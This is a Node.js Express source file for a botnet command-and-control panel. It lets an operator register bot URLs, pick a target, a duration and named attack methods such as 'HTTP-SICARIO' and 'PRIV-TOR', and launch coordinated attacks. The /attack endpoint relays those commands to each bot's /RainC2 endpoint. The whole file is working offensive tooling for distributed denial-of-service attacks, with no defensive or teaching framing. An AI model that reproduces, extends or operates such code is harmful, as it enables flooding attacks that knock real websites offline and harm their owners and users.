const express = require('express');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 5552;

// Store connected bots
let connectedBots = [];

async function fetchData() {
  try {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    console.log('\n========================================');
    console.log('🎮 Master Control Server Started!');
    console.log('========================================');
    console.log(`📍 Local:    http://localhost:${port}`);
    console.log(`🌐 Network:  http://${data.origin}:${port}`);
    console.log('========================================\n');
    return data;
  } catch (error) {
    console.log(`Server running at http://localhost:${port}`);
  }
}

// Serve Master Control UI
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master Control Server</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes pulse-glow {
            0%, 100% { box-shadow: 0 0 20px rgba(239, 68, 68, 0.5); }
            50% { box-shadow: 0 0 40px rgba(239, 68, 68, 0.8); }
        }
        .pulse-glow { animation: pulse-glow 2s infinite; }
    </style>
</head>
<body class="bg-gradient-to-br from-gray-900 via-black to-gray-900 text-white min-h-screen">
    <!-- Header -->
    <div class="bg-black border-b border-red-900 shadow-lg">
        <div class="max-w-7xl mx-auto px-6 py-4">
            <div class="flex items-center justify-between">
                <div class="flex items-center gap-3">
                    <div class="w-12 h-12 bg-gradient-to-br from-red-600 to-red-800 rounded-lg flex items-center justify-center pulse-glow">
                        <span class="text-2xl">👑</span>
                    </div>
                    <div>
                        <h1 class="text-2xl font-bold bg-gradient-to-r from-red-500 to-purple-600 bg-clip-text text-transparent">
                            Master Control Server
                        </h1>
                        <p class="text-xs text-gray-400">Command & Control Multiple Bots</p>
                    </div>
                </div>
                <div class="text-right">
                    <div class="text-xs text-gray-500">Bots Connected</div>
                    <div class="flex items-center gap-2">
                        <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                        <span class="text-2xl text-green-400 font-bold" id="botCount">0</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="max-w-7xl mx-auto px-6 py-8">
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <!-- Bot Management -->
            <div class="lg:col-span-2 space-y-6">
                <!-- Add Bot -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                    <div class="bg-gradient-to-r from-blue-900/50 to-purple-900/50 px-6 py-4 border-b border-gray-700">
                        <h2 class="text-xl font-bold flex items-center gap-2">
                            <span>🤖</span> Add Bot Client
                        </h2>
                    </div>
                    <div class="p-6">
                        <div class="flex gap-2">
                            <input type="text" id="botUrl" 
                                class="flex-1 bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/50" 
                                placeholder="http://192.168.1.100:5552">
                            <button onclick="addBot()" 
                                class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg transition-all">
                                Add Bot
                            </button>
                        </div>
                        <p class="text-xs text-gray-500 mt-2">Enter the bot's URL (example: http://192.168.1.100:5552)</p>
                    </div>
                </div>

                <!-- Connected Bots List -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                    <div class="bg-gradient-to-r from-green-900/50 to-blue-900/50 px-6 py-4 border-b border-gray-700">
                        <h2 class="text-xl font-bold flex items-center gap-2">
                            <span>📡</span> Connected Bots
                        </h2>
                    </div>
                    <div class="p-6">
                        <div id="botsList" class="space-y-2">
                            <p class="text-gray-500 text-center py-8">No bots connected yet...</p>
                        </div>
                    </div>
                </div>

                <!-- Attack Control -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                    <div class="bg-gradient-to-r from-red-900/50 to-purple-900/50 px-6 py-4 border-b border-gray-700">
                        <h2 class="text-xl font-bold flex items-center gap-2">
                            <span>⚔️</span> Attack All Bots
                        </h2>
                    </div>
                    <div class="p-6 space-y-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-300 mb-2">🎯 Target URL</label>
                            <input type="text" id="target" 
                                class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50" 
                                placeholder="https://example.com">
                        </div>

                        <div class="grid grid-cols-2 gap-4">
                            <div>
                                <label class="block text-sm font-medium text-gray-300 mb-2">⏱️ Duration (seconds)</label>
                                <input type="number" id="time" value="60" 
                                    class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50" 
                                    min="1">
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-300 mb-2">💣 Attack Method</label>
                                <select id="method" 
                                    class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50">
                                    <option>HTTP-SICARIO</option>
                                    <option>RAW-HTTP</option>
                                    <option>R9</option>
                                    <option>PRIV-TOR</option>
                                    <option>HOLD-PANEL</option>
                                    <option>R1</option>
                                </select>
                            </div>
                        </div>

                        <button onclick="attackAll()" id="attackBtn" 
                            class="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
                            🚀 Launch Attack on All Bots
                        </button>
                    </div>
                </div>

                <!-- Activity Logs -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                    <div class="bg-gradient-to-r from-purple-900/50 to-pink-900/50 px-6 py-4 border-b border-gray-700 flex items-center justify-between">
                        <h2 class="text-xl font-bold flex items-center gap-2">
                            <span>📊</span> Activity Logs
                        </h2>
                        <button onclick="clearLogs()" 
                            class="text-xs bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded transition-colors">
                            Clear
                        </button>
                    </div>
                    <div class="p-6">
                        <div id="logs" class="bg-gray-900 rounded-lg border border-gray-700 p-4 h-64 overflow-y-auto font-mono text-sm">
                            <p class="text-gray-500 text-center py-8">No activity yet...</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Sidebar -->
            <div class="space-y-6">
                <!-- Stats -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
                    <h3 class="text-lg font-bold mb-4">📈 Statistics</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400 text-sm">Total Bots</span>
                            <span class="text-blue-400 font-bold" id="totalBots">0</span>
                        </div>
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400 text-sm">Active Attacks</span>
                            <span class="text-red-400 font-bold" id="activeAttacks">0</span>
                        </div>
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400 text-sm">Total Attacks</span>
                            <span class="text-green-400 font-bold" id="totalAttacks">0</span>
                        </div>
                    </div>
                </div>

                <!-- Quick Actions -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
                    <h3 class="text-lg font-bold mb-4">⚡ Quick Actions</h3>
                    <div class="space-y-2">
                        <button onclick="refreshBots()" 
                            class="w-full bg-gray-700 hover:bg-gray-600 text-white py-2 px-4 rounded transition-colors text-sm">
                            🔄 Refresh Bots
                        </button>
                        <button onclick="removeAllBots()" 
                            class="w-full bg-red-900/50 hover:bg-red-800/50 text-white py-2 px-4 rounded transition-colors text-sm">
                            🗑️ Remove All Bots
                        </button>
                    </div>
                </div>

                <!-- Available Methods -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
                    <h3 class="text-lg font-bold mb-4">📋 Attack Methods</h3>
                    <div class="space-y-2 text-xs">
                        <div class="bg-gray-900 p-2 rounded border border-red-900/30">
                            <div class="text-red-400 font-bold">HTTP-SICARIO</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-orange-900/30">
                            <div class="text-orange-400 font-bold">RAW-HTTP</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-yellow-900/30">
                            <div class="text-yellow-400 font-bold">R9</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-green-900/30">
                            <div class="text-green-400 font-bold">PRIV-TOR</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-blue-900/30">
                            <div class="text-blue-400 font-bold">HOLD-PANEL</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-purple-900/30">
                            <div class="text-purple-400 font-bold">R1</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let bots = [];
        let totalAttacks = 0;
        let activeAttacks = 0;

        function updateStats() {
            document.getElementById('botCount').textContent = bots.length;
            document.getElementById('totalBots').textContent = bots.length;
            document.getElementById('totalAttacks').textContent = totalAttacks;
            document.getElementById('activeAttacks').textContent = activeAttacks;
        }

        function renderBots() {
            const botsList = document.getElementById('botsList');
            if (bots.length === 0) {
                botsList.innerHTML = '<p class="text-gray-500 text-center py-8">No bots connected yet...</p>';
                return;
            }

            botsList.innerHTML = bots.map((bot, index) => \`
                <div class="bg-gray-900 p-4 rounded-lg border border-gray-700 flex items-center justify-between">
                    <div class="flex items-center gap-3">
                        <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                        <div>
                            <div class="text-white font-mono text-sm">\${bot}</div>
                            <div class="text-xs text-gray-500">Bot #\${index + 1}</div>
                        </div>
                    </div>
                    <button onclick="removeBot(\${index})" 
                        class="text-red-400 hover:text-red-300 text-sm">
                        Remove
                    </button>
                </div>
            \`).join('');
        }

        function addBot() {
            const url = document.getElementById('botUrl').value.trim();
            if (!url) {
                addLog('Error: Please enter a bot URL', 'error');
                return;
            }

            if (bots.includes(url)) {
                addLog('Error: Bot already added', 'error');
                return;
            }

            bots.push(url);
            document.getElementById('botUrl').value = '';
            renderBots();
            updateStats();
            addLog(\`Bot added: \${url}\`, 'success');
        }

        function removeBot(index) {
            const bot = bots[index];
            bots.splice(index, 1);
            renderBots();
            updateStats();
            addLog(\`Bot removed: \${bot}\`, 'info');
        }

        function removeAllBots() {
            if (confirm('Remove all bots?')) {
                bots = [];
                renderBots();
                updateStats();
                addLog('All bots removed', 'info');
            }
        }

        function refreshBots() {
            renderBots();
            updateStats();
            addLog('Bots list refreshed', 'info');
        }

        async function attackAll() {
            const target = document.getElementById('target').value;
            const time = document.getElementById('time').value;
            const method = document.getElementById('method').value;

            if (!target || !time) {
                addLog('Error: Target and time required', 'error');
                return;
            }

            if (bots.length === 0) {
                addLog('Error: No bots connected', 'error');
                return;
            }

            const btn = document.getElementById('attackBtn');
            btn.disabled = true;
            btn.textContent = '⏳ Launching...';

            activeAttacks++;
            totalAttacks++;
            updateStats();

            addLog(\`Launching \${method} attack to \${bots.length} bots\`, 'info');
            addLog(\`Target: \${target} | Duration: \${time}s\`, 'info');

            let successCount = 0;
            let failCount = 0;

            for (const bot of bots) {
                try {
                    const response = await fetch(\`/attack?bot=\${encodeURIComponent(bot)}&target=\${encodeURIComponent(target)}&time=\${time}&methods=\${method}\`);
                    const data = await response.json();
                    
                    if (data.success) {
                        successCount++;
                        addLog(\`✅ \${bot} - Attack launched\`, 'success');
                    } else {
                        failCount++;
                        addLog(\`❌ \${bot} - Failed: \${data.error}\`, 'error');
                    }
                } catch (error) {
                    failCount++;
                    addLog(\`❌ \${bot} - Network error\`, 'error');
                }
            }

            addLog(\`Attack complete: \${successCount} success, \${failCount} failed\`, 'info');

            setTimeout(() => {
                activeAttacks = Math.max(0, activeAttacks - 1);
                updateStats();
            }, parseInt(time) * 1000);

            btn.disabled = false;
            btn.textContent = '🚀 Launch Attack on All Bots';
        }

        function addLog(message, type = 'info') {
            const logsDiv = document.getElementById('logs');
            const timestamp = new Date().toLocaleTimeString();
            const icons = { info: '🔵', success: '✅', error: '❌' };
            const colors = { info: 'text-blue-400', success: 'text-green-400', error: 'text-red-400' };
            
            if (logsDiv.querySelector('.text-gray-500')) {
                logsDiv.innerHTML = '';
            }
            
            const logEntry = document.createElement('div');
            logEntry.className = 'mb-2 pb-2 border-b border-gray-800';
            logEntry.innerHTML = \`
                <div class="flex items-start gap-2">
                    <span>\${icons[type]}</span>
                    <div class="flex-1">
                        <span class="text-gray-500 text-xs">[\${timestamp}]</span>
                        <span class="\${colors[type]} ml-2">\${message}</span>
                    </div>
                </div>
            \`;
            logsDiv.appendChild(logEntry);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        function clearLogs() {
            document.getElementById('logs').innerHTML = '<p class="text-gray-500 text-center py-8">No activity yet...</p>';
        }

        // Load bots from localStorage
        window.addEventListener('load', () => {
            const saved = localStorage.getItem('bots');
            if (saved) {
                bots = JSON.parse(saved);
                renderBots();
                updateStats();
            }
        });

        // Save bots to localStorage
        window.addEventListener('beforeunload', () => {
            localStorage.setItem('bots', JSON.stringify(bots));
        });
    </script>
</body>
</html>
  `);
});

// Attack endpoint - sends commands to bots
app.get('/attack', async (req, res) => {
  const { bot, target, time, methods } = req.query;

  if (!bot || !target || !time || !methods) {
    return res.json({ success: false, error: 'Missing parameters' });
  }

  try {
    console.log(`[ATTACK] Sending to ${bot}: ${methods} -> ${target} for ${time}s`);
    
    const response = await axios.get(`${bot}/RainC2`, {
      params: { target, time, methods },
      timeout: 5000
    });

    res.json({ success: true, data: response.data });
  } catch (error) {
    console.error(`[ERROR] Failed to contact ${bot}: ${error.message}`);
    res.json({ success: false, error: error.message });
  }
});

// Get connected bots
app.get('/bots', (req, res) => {
  res.json({ bots: connectedBots });
});

app.listen(port, () => {
  fetchData();
});
